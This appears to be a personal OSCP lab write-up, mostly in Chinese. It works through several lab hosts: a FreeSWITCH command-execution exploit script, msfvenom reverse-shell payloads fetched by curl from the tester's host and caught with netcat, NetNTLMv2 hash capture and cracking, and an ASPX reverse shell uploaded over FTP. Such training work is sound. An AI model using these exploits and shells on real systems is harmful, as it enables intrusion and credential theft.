# Nmap
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_B]
└─$ nmap -sV -T4 -A -iL target
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-02 22:47 CST
Nmap scan report for 192.168.241.147
Host is up (0.29s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT     STATE    SERVICE       VERSION
21/tcp   open     ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
22/tcp   open     ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds?
1145/tcp filtered x9-icue
8000/tcp open     http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
|_http-open-proxy: Proxy might be redirecting requests
| http-methods:
|_  Potentially risky methods: TRACE
8080/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
8443/tcp open     ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn:
|_  http/1.1
|_ssl-date: 2023-08-02T14:51:47+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=MS01.oscp.exam
| Subject Alternative Name: DNS:MS01.oscp.exam
| Not valid before: 2022-11-11T07:04:43
|_Not valid after:  2023-11-10T00:00:00
|_http-title: Bad Request
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-08-02T14:51:40
|_  start_date: N/A

Nmap scan report for 192.168.241.149
Host is up (0.31s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE    SERVICE       VERSION
21/tcp   open     ftp           vsftpd 3.0.3
22/tcp   open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 5c:5f:f1:bb:02:f9:14:7c:8e:38:32:2b:f4:bc:d0:8c (RSA)
|   256 18:e2:47:e1:c8:40:a1:d0:2c:a5:87:97:bd:01:12:27 (ECDSA)
|_  256 26:2d:98:d9:47:6d:22:5d:4a:14:7a:24:5c:98:a2:1d (ED25519)
80/tcp   open     http          Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2100/tcp filtered amiganetfs
2119/tcp filtered gsigatekeeper
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.241.150
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ad:ac:80:0a:5f:87:44:ea:ba:7f:95:ca:1e:90:78:0d (ECDSA)
|_  256 b3:ae:d1:25:24:c2:ab:4f:f9:40:c5:f0:0b:12:87:bb (ED25519)
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Spring Java Framework
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404
|     Content-Type: application/json;charset=UTF-8
|     Date: Wed, 02 Aug 2023 14:49:52 GMT
|     Connection: close
|     {"timestamp":"2023-08-02T14:49:53.607+0000","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/plain;charset=UTF-8
|     Content-Length: 19
|     Date: Wed, 02 Aug 2023 14:49:51 GMT
|     Connection: close
|     {"api-status":"up"}
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Wed, 02 Aug 2023 14:49:51 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 505
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 830
|     Date: Wed, 02 Aug 2023 14:49:52 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505
|     HTTP Version Not Supported</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1
|   Socks5:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 800
|     Date: Wed, 02 Aug 2023 14:49:54 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|_    Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=8/2%Time=64CA6D0F%P=aarch64-unknown-linux-gnu
SF:%r(GetRequest,98,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/plain;c
SF:harset=UTF-8\r\nContent-Length:\x2019\r\nDate:\x20Wed,\x2002\x20Aug\x20
SF:2023\x2014:49:51\x20GMT\r\nConnection:\x20close\r\n\r\n{\"api-status\":
SF:\"up\"}")%r(HTTPOptions,75,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,
SF:OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2002\x20Aug\x202023\x
SF:2014:49:51\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,3C6,"
SF:HTTP/1\.1\x20505\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nCon
SF:tent-Language:\x20en\r\nContent-Length:\x20830\r\nDate:\x20Wed,\x2002\x
SF:20Aug\x202023\x2014:49:52\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang
SF:=\"en\"><head><title>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20V
SF:ersion\x20Not\x20Supported</title><style\x20type=\"text/css\">h1\x20{fo
SF:nt-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;
SF:font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-serif;color:wh
SF:ite;background-color:#525D76;font-size:16px;}\x20h3\x20{font-family:Tah
SF:oma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14p
SF:x;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color:black;backgro
SF:und-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-serif;color:wh
SF:ite;background-color:#525D76;}\x20p\x20{font-family:Tahoma,Arial,sans-s
SF:erif;background:white;color:black;font-size:12px;}\x20a\x20{color:black
SF:;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px;background-col
SF:or:#525D76;border:none;}</style></head><body><h1")%r(FourOhFourRequest,
SF:113,"HTTP/1\.1\x20404\x20\r\nContent-Type:\x20application/json;charset=
SF:UTF-8\r\nDate:\x20Wed,\x2002\x20Aug\x202023\x2014:49:52\x20GMT\r\nConne
SF:ction:\x20close\r\n\r\n{\"timestamp\":\"2023-08-02T14:49:53\.607\+0000\
SF:",\"status\":404,\"error\":\"Not\x20Found\",\"message\":\"No\x20message
SF:\x20available\",\"path\":\"/nice%20ports%2C/Tri%6Eity\.txt%2ebak\"}")%r
SF:(Socks5,3BB,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset
SF:=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20800\r\nDate:\x2
SF:0Wed,\x2002\x20Aug\x202023\x2014:49:54\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Statu
SF:s\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text
SF:/css\">h1\x20{font-family:Tahoma,Arial,sans-serif;color:white;backgroun
SF:d-color:#525D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,san
SF:s-serif;color:white;background-color:#525D76;font-size:16px;}\x20h3\x20
SF:{font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D
SF:76;font-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;col
SF:or:black;background-color:white;}\x20b\x20{font-family:Tahoma,Arial,san
SF:s-serif;color:white;background-color:#525D76;}\x20p\x20{font-family:Tah
SF:oma,Arial,sans-serif;background:white;color:black;font-size:12px;}\x20a
SF:\x20{color:black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1p
SF:x;background-color:#525D76;border:none;}</style></head><body");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.241.151
Host is up (0.30s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE          VERSION
80/tcp   open  http             Microsoft IIS httpd 10.0
|_http-title: IIS Windows
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: OSCP
|   DNS_Computer_Name: OSCP
|   Product_Version: 10.0.19041
|_  System_Time: 2023-08-02T14:51:37+00:00
| ssl-cert: Subject: commonName=OSCP
| Not valid before: 2023-05-09T08:52:26
|_Not valid after:  2023-11-08T08:52:26
|_ssl-date: 2023-08-02T14:51:47+00:00; 0s from scanner time.
5060/tcp open  sip-proxy        FreeSWITCH mod_sofia 1.10.1~64bit
|_sip-methods: INVITE, ACK, BYE, CANCEL, OPTIONS, MESSAGE, INFO, UPDATE, REGISTER, REFER, NOTIFY, PUBLISH, SUBSCRIBE
5080/tcp open  sip-proxy        FreeSWITCH mod_sofia 1.10.1~64bit
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
8081/tcp open  websocket        (WebSocket version: 13)
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions:
|     HTTP/1.1 400 Bad Request
|_    Sec-WebSocket-Version: 13
8082/tcp open  ssl/websocket    (WebSocket version: 13)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=FreeSWITCH/countryName=US
| Not valid before: 2022-10-28T14:47:12
|_Not valid after:  1986-09-04T08:18:56
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions:
|     HTTP/1.1 400 Bad Request
|_    Sec-WebSocket-Version: 13
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8081-TCP:V=7.92%I=7%D=8/2%Time=64CA6D0F%P=aarch64-unknown-linux-gnu
SF:%r(GetRequest,37,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nSec-WebSocket-V
SF:ersion:\x2013\r\n\r\n")%r(GenericLines,37,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nSec-WebSocket-Version:\x2013\r\n\r\n")%r(HTTPOptions,37,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nSec-WebSocket-Version:\x2013\r\n\r\n"
SF:);
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8082-TCP:V=7.92%T=SSL%I=7%D=8/2%Time=64CA6D29%P=aarch64-unknown-lin
SF:ux-gnu%r(GenericLines,37,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nSec-Web
SF:Socket-Version:\x2013\r\n\r\n")%r(GetRequest,37,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nSec-WebSocket-Version:\x2013\r\n\r\n")%r(HTTPOptions,37
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nSec-WebSocket-Version:\x2013\r\
SF:n\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 6 IP addresses (4 hosts up) scanned in 235.03 seconds
```


## 151

透過 nmap 發現 5060、5080、8021 有跑 freeswitch 服務，先使用 searchsploit 查看
```json
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit)                                   | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                                                      | windows/remote/47799.txt
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

發現有 command execution 弱點，
```bash
searchsploit -m 47799
```

依照 txt file 建立 python 腳本
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_B/151]
└─$ cat test.py

from socket import *
import sys

if len(sys.argv) != 3:
    print('Missing arguments')
    print('Usage: freeswitch-exploit.py <target> <cmd>')
    sys.exit(1)

ADDRESS=sys.argv[1]
CMD=sys.argv[2]
PASSWORD='ClueCon' # default password for FreeSWITCH

s=socket(AF_INET, SOCK_STREAM)
s.connect((ADDRESS, 8021))

response = s.recv(1024)
if b'auth/request' in response:
    s.send(bytes('auth {}\n\n'.format(PASSWORD), 'utf8'))
    response = s.recv(1024)
    if b'+OK accepted' in response:
        print('Authenticated')
        s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
        response = s.recv(8096).decode()
        print(response)
    else:
        print('Authentication failed')
        sys.exit(1)
else:
    print('Not prompted for authentication, likely not vulnerable')
    sys.exit(1)
```

執行 python 腳本
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_B/151]
└─$ python3 test.py 192.168.241.151 whoami
Authenticated
Content-Type: api/response
Content-Length: 11

oscp\chris
```

可成功利用 command execution 漏洞，首先用 msfvenom 建立 reverse shell 檔案
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.169 LPORT=4444 -f exe -o shell.exe
```

透過 python http server，從靶機下載
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_B/151]
└─$ python3 test.py 192.168.241.151 "curl http://192.168.45.169:8000/shell.exe --output shell.exe"
Authenticated
Content-Type: api/response
Content-Length: 14



┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_B/151]
└─$ python3 test.py 192.168.241.151 "dir"
Authenticated
Content-Type: api/response
Content-Length: 2530

 Volume in drive C has no label.
 Volume Serial Number is 949E-5CA2

 Directory of C:\Program Files\FreeSWITCH

08/03/2023  07:17 AM    <DIR>          .
08/03/2023  07:17 AM    <DIR>          ..
11/04/2022  07:47 AM    <DIR>          cert
11/04/2022  07:46 AM    <DIR>          conf
08/03/2023  07:09 AM    <DIR>          db
11/04/2022  01:56 PM    <DIR>          fonts
08/20/2019  12:08 PM         4,991,488 FreeSwitch.dll
08/20/2019  12:08 PM            26,624 FreeSwitchConsole.exe
08/20/2019  12:19 PM            62,976 fs_cli.exe
11/04/2022  01:56 PM    <DIR>          grammar
11/04/2022  01:56 PM    <DIR>          htdocs
11/04/2022  01:56 PM    <DIR>          images
05/13/2019  06:13 AM           293,888 ks.dll
08/20/2019  12:04 PM           152,064 libapr.dll
08/20/2019  12:04 PM           134,656 libaprutil.dll
08/20/2019  12:16 PM           131,584 libbroadvoice.dll
03/21/2018  08:39 PM         1,805,824 libeay32.dll
03/23/2019  04:37 PM         1,050,112 libmariadb.dll
11/04/2022  01:56 PM    <DIR>          libmariadb_plugin
08/20/2019  12:06 PM           190,464 libpng16.dll
04/05/2018  09:18 AM           279,552 libpq.dll
04/04/2018  05:59 PM         1,288,192 libsndfile-1.dll
08/20/2019  12:05 PM         1,291,776 libspandsp.dll
08/20/2019  12:04 PM            27,648 libteletone.dll
08/03/2023  07:09 AM    <DIR>          log
08/09/2018  11:42 AM           283,648 lua53.dll
11/04/2022  01:56 PM    <DIR>          mod
04/09/2018  12:36 PM        66,362,368 opencv_world341.dll
11/04/2022  01:56 PM           825,160 openh264.dll
08/20/2019  12:02 PM             4,596 OPENH264_BINARY_LICENSE.txt
04/03/2018  05:31 PM           147,456 pcre.dll
08/20/2019  12:14 PM           313,856 pocketsphinx.dll
08/20/2019  12:10 PM            49,152 pthread.dll
11/04/2022  07:46 AM    <DIR>          recordings
03/03/2023  07:56 AM    <DIR>          run
11/04/2022  07:46 AM    <DIR>          scripts
08/03/2023  07:17 AM            73,802 shell.exe
05/13/2019  07:03 AM           165,888 signalwire_client.dll
11/04/2022  01:56 PM    <DIR>          sounds
08/20/2019  12:14 PM           366,592 sphinxbase.dll
03/21/2018  08:39 PM           349,184 ssleay32.dll
11/04/2022  07:47 AM    <DIR>          storage
03/24/2018  08:20 PM        15,766,528 v8.dll
03/24/2018  08:05 PM           177,152 v8_libbase.dll
03/24/2018  08:19 PM           134,656 v8_libplatform.dll
04/03/2018  02:01 PM           126,976 zlib.dll
              29 File(s)     96,873,862 bytes
              17 Dir(s)  11,445,567,488 bytes free

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_B/151]
└─$ python3 test.py 192.168.241.151 ".\shell.exe"
```

kali:
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_B/151]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.169] from (UNKNOWN) [192.168.241.151] 50484
Microsoft Windows [Version 10.0.19043.2130]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\FreeSWITCH>
```

get shell!

### 151提權

```json
����������͹ Basic System Information
� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
    OS Name: Microsoft Windows 10 Pro
    OS Version: 10.0.19043 N/A Build 19043
    System Type: x64-based PC
    Hostname: OSCP
    ProductName: Windows 10 Pro
    EditionID: Professional
    ReleaseId: 2009
    BuildBranch: vb_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 4
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 8/3/2023 7:21:49 AM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: KB5020613, KB4562830, KB4570334, KB4577586, KB4580325, KB4586864, KB5000736, KB5012170, KB5018410, KB5014032, KB5016705,
```

```json
����������͹ Current Token privileges
� Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation
    SeShutdownPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: DISABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
    SeTimeZonePrivilege: DISABLED
```

從 winPEASx64.exe 的結果來看，該機器是 win10 且有 SeImpersonatePrivilege 權限，嘗試使用 printspoofer.exe 提權但失敗

## 147

	重連 VPN，IP 換成 192.168.207.xxx & 10.10.97.xxx

透過 nmap 看到有 CN 資訊
```json
| ssl-cert: Subject: commonName=MS01.oscp.exam
| Subject Alternative Name: DNS:MS01.oscp.exam
```

將其加入 /etc/hosts，並嘗試連線至 https://ms01.oscp.exam

![[截圖 2023-08-07 下午10.33.54.png]]

在 kali 先起 smbserver
```bash
impacket-smbserver test . -smb2support
```

嘗試在 Url 欄位輸入 \\\\192.168.45.206\\test，確認該欄位可接受 smb 路徑，並會帶 credential 來驗證，成功得到 hash (smb relay attack)

```json
┌──(ouyang㉿kali)-[~/tools]
└─$ impacket-smbserver test . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.207.147,60185)
[*] AUTHENTICATE_MESSAGE (OSCP\web_svc,MS01)
[*] User MS01\web_svc authenticated successfully
[*] web_svc::OSCP:aaaaaaaaaaaaaaaa:37ab1b989ee9c06f30cf004da7f34c3b:0101000000000000801ccf8b3bc9d901a5c152a792ab6d6500000000010010007600440072004200780065006400430003001000760044007200420078006500640043000200100046005300610044004e005700710057000400100046005300610044004e0057007100570007000800801ccf8b3bc9d90106000400020000000800300030000000000000000000000000300000b4ea36f8f13a25f0560ae4164ea52b7b67419d0a9d0cc10fdae72541af629e670a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200300036000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:test)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:test)
[*] Closing down connection (192.168.207.147,60185)
[*] Remaining connections []
```

透過 hashcat 爆破

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_B/147]
└─$ hashcat -a 0 hash /usr/share/wordlists/rockyou.txt -m 5600
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: pthread-0x000, 1439/2943 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

WEB_SVC::OSCP:aaaaaaaaaaaaaaaa:37ab1b989ee9c06f30cf004da7f34c3b:0101000000000000801ccf8b3bc9d901a5c152a792ab6d6500000000010010007600440072004200780065006400430003001000760044007200420078006500640043000200100046005300610044004e005700710057000400100046005300610044004e0057007100570007000800801ccf8b3bc9d90106000400020000000800300030000000000000000000000000300000b4ea36f8f13a25f0560ae4164ea52b7b67419d0a9d0cc10fdae72541af629e670a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200300036000000000000000000:Diamond1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: WEB_SVC::OSCP:aaaaaaaaaaaaaaaa:37ab1b989ee9c06f30cf...000000
Time.Started.....: Mon Aug  7 22:40:19 2023 (3 secs)
Time.Estimated...: Mon Aug  7 22:40:22 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   472.8 kH/s (0.97ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 24576/14344385 (0.17%)
Rejected.........: 0/24576 (0.00%)
Restore.Point....: 24064/14344385 (0.17%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: hotmom -> 280789
Hardware.Mon.#1..: Util:  9%

Started: Mon Aug  7 22:40:17 2023
Stopped: Mon Aug  7 22:40:23 2023
```

得到一組帳密！
```json
WEB_SVC/Diamond1
```

嘗試 ssh 
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_B/147]
└─$ ssh WEB_SVC@192.168.207.147
The authenticity of host '192.168.207.147 (192.168.207.147)' can't be established.
ED25519 key fingerprint is SHA256:PMbZrT8kUg780yVuSoaF+1RVTe3iNvDE/DquCs74qWU.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:23: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.207.147' (ED25519) to the list of known hosts.
WEB_SVC@192.168.207.147's password:
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

oscp\web_svc@MS01 C:\Users\web_svc>
```

get shell! 執行 WinPEASx64.exe

```json
╔══════════╣ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  oscp.exam
    DefaultUserName               :  celia.almeda

```

發現有許多項目因權限不足無法顯示，嘗試上傳 reverse_shell 並透過 web 呼叫執行，看是否能透過 celia.almeda 登入

透過 ftp 連線

```json
┌──(ouyang㉿kali)-[~]
└─$ ftp 192.168.207.147
Connected to 192.168.207.147.
220 Microsoft FTP Service
Name (192.168.207.147:ouyang): WEB_SVC
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp>

ftp> dir
229 Entering Extended Passive Mode (|||60340|)
125 Data connection already open; Transfer starting.
11-14-22  12:17AM       <DIR>          aspnet_client
11-10-22  04:53AM       <DIR>          custerr
11-11-22  12:12AM       <DIR>          ftproot
11-14-22  01:36AM       <DIR>          history
11-11-22  12:16AM       <DIR>          logs
11-14-22  12:17AM       <DIR>          pportal
11-10-22  04:53AM       <DIR>          temp
12-01-22  04:26AM       <DIR>          wwwroot
226 Transfer complete.

ftp> cd wwwroot
250 CWD command successful.

ftp> dir
229 Entering Extended Passive Mode (|||60346|)
125 Data connection already open; Transfer starting.
11-10-22  04:53AM                  696 iisstart.htm
11-10-22  04:53AM                98757 iisstart.png
226 Transfer complete.
```

發現 wwwroot 資料夾，判斷為 asp.net，嘗試上傳 webshell 進去
先製作 web reverse shell，再透過 ftp 上傳
```bash
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_B/147]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.206 LPORT=4444 -f aspx -o reverse_shell.aspx
```

ftp:
```bash
put reverse_shell.aspx
```

web:
```http
http://192.168.207.147:8000/reverse_shell.aspx
```

get shell!

### 147 提權

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/LAB_B/147]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.206] from (UNKNOWN) [192.168.207.147] 60369
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>whoami /all
whoami /all

USER INFORMATION
----------------

User Name                  SID
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
